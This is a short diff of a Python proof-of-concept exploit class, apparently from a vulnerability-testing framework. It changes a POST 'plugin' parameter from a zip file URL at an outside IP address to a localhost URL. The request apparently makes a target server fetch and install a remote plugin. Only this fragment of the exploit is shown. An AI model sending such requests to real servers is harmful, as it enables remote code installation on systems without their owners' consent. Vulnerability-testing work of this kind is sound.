@@ -28,7 +28,7 @@ class DemoPOC(POCBase):
             "Content-Type": "application/x-www-form-urlencoded"
         }
         data = {
-            "plugin": "http://74.48.195.11/test.zip"
+            "plugin": "http://127.0.0.1/test.zip"
         }
         try:
             response = requests.post(url, headers=headers, data=data, timeout=10, verify=False)
